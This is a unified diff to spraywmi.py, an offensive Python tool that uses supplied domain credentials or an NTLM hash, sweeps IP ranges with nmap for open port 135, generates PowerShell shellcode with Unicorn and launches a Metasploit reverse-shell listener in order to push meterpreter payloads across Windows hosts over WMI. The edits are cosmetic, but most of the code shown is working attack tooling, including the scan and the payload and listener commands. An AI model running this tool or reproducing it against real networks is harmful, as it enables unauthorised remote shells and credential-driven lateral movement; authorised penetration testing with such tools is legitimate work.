@@ -15,7 +15,7 @@
 #
 # Make sure to close meterpreter properly (exit or kill session) or else the server may spike high CPU - weirdness with PowerShell.
 
-# CONFIGURE THE PATH TO UNICORN: github.com/trustedsec/unicorn
+# Configure the path to Unicorn: github.com/trustedsec/unicorn
 import subprocess
 import os
 import sys
@@ -45,7 +45,7 @@ except ImportError:
 	subprocess.Popen("python -m pip install pexpect", shell=True).wait()
 	try: import pexpect
 	except ImportError:
-		print ("[!] Sorry, could not install pexpect. Try installing it manually: python-pexpect")
+		print ("[!] Sorry, could not install pexpect. Try installing it manually: python-pexpect\n\n")
 		sys.exit()
 
 # Main variable assignment from command line parameters.
@@ -80,32 +80,34 @@ except IndexError:
 
 	print ("""Flag descriptions:
 
-DOMAIN - Domain you are attacking. If its local, just specify workgroup.
-USERNAME - Username to authenticate on the remote Windows system.
-PASSWORD - Password or password hash LM:NTLM to use on the remote Windows system.
-CIDR_RANGE,CIDR_RANGE or ips.txt - Specify a single IP, CIDR range (192.168.1.1/24) or multiple CIDRs: 192.168.1.1/24,192.168.2.1/24. You can also specify a file (ex: file.txt), which contains single IP addresses on a new line. 
-METASPLOIT_PAYLOAD - Metasploit payload, example: windows/meterpreter/reverse_tcp
-REVERSE_SHELL_IP - Reverse shell IP address (LHOST).
-REVERSE_SHELL_PORT - Reverse shell listening port (LPORT).
-OPTIONAL: NO - specify no if you do not want to create a listener. This is useful if you already have a listener established. If you do not specify a value, it will automatically create a listener for you.
+DOMAIN                 Domain you are attacking. If its local, just specify workgroup.
+USERNAME               Username to authenticate on the remote Windows system.
+PASSWORD               Password or password hash LM:NTLM to use on the remote Windows system.
+CIDR_RANGE or file     Specify a single IP, CIDR range (192.168.1.1/24) or multiple CIDRs: 192.168.1.1/24,192.168.2.1/24. 
+                          You can also specify a file (ex: file.txt) that contains a single IP addresses on each line. 
+METASPLOIT_PAYLOAD     Metasploit payload, example: windows/meterpreter/reverse_tcp
+REVERSE_SHELL_IP       Reverse shell IP address (LHOST).
+REVERSE_SHELL_PORT     Reverse shell listening port (LPORT).
+OPTIONAL: NO           Specify no if you do not want to create a listener. This is useful if you already have a listener 
+                          established. If you do not specify a value, it will automatically create a listener for you.
 """)
 	print ("Usage: python spraywmi.py <domain> <username> <password or hash lm:ntlm> <cidr_range,cidr_range or ips.txt> <metasploit_payload> <reverse_shell_ip> <reverse_shell_port> <optional: no>\n")
 	sys.exit()
 
-print ("[*] Launching SprayWMI on the hosts specified...")
+print ("[*] Launching SprayWMI on the hosts specified.")
 
 # Start Unicorn first.
 if os.path.isfile(unicorn + "/unicorn.py"):
 	os.chdir(unicorn)
-	print ("[*] Generating shellcode through unicorn, could take a few seconds...")
+	print ("[*] Generating shellcode through Unicorn This could take a few seconds.")
 	subprocess.Popen("python unicorn.py %s %s %s" % (meta, revshell, revport), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	if optional == "":
-		print ("[*] Launching the listener in the background...")	
+		print ("[*] Launching the listener in the background.")	
 		time.sleep(1)
 		child = pexpect.spawn("msfconsole -r %s/unicorn.rc" % (unicorn))
-	        print ("[*] Waiting for the listener to start first before we continue forward...")
-	        print ("[*] Be patient, Metaploit takes a little bit to start...")
-	        child.expect("Starting the payload handler", timeout=30000)
+	        print ("[*] Waiting for the listener to start first before we continue forward.")
+	        print ("[*] Be patient, Metaploit takes a little bit to start.")
+	        child.expect("Starting the payload handler.", timeout=30000)
 	unicorn_code = file(unicorn + "/powershell_attack.txt", "r").read()
 	# All back to normal.
 	os.chdir(definepath)
@@ -118,7 +120,7 @@ else:
 if not os.path.isfile(cidr):
 	# If we have multiple CIDRs, then split them up for nmap.
 	if "," in cidr:
-		print ("[*] Multiple CIDR notations found, splitting them up...")
+		print ("[*] Multiple CIDR notations found, splitting them up.")
 		cidr_range = cidr.split(",")
 		cidr_temp = ""
 		for cidrs in cidr_range:
@@ -129,7 +131,7 @@ if not os.path.isfile(cidr):
 
 	# Sweep networks first.
 	print ("[*] Sweeping targets for open TCP port 135 first, then moving through. Be patient.")
-	subprocess.Popen("nmap -Pn -n -p135 --open -oG - %s -T5 | awk '$NF~/msrpc/{print $2}' > openwmi.txt" % (cidr), shell=True).wait()
+	subprocess.Popen("nmap -Pn -n -T5 --open -p135 -oG - %s | awk '$NF~/msrpc/{print $2}' > openwmi.txt" % (cidr), shell=True).wait()
 
 	# Next we create the WMI command.
 	fileopen = file("openwmi.txt", "r").readlines()
@@ -171,8 +173,8 @@ if counter == 1:
 				time.sleep(15)
 
 			except KeyboardInterrupt:
-				print "[*] Exiting SprayWMI...\n"
+				print "[*] Exiting SprayWMI.\n\n"
 				sys.exit()
 else:
-	print ("[*] Unable to identify targets with open TCP port 135.")
+	print ("[*] Unable to identify targets with open TCP port 135.\n\n")
 	sys.exit()
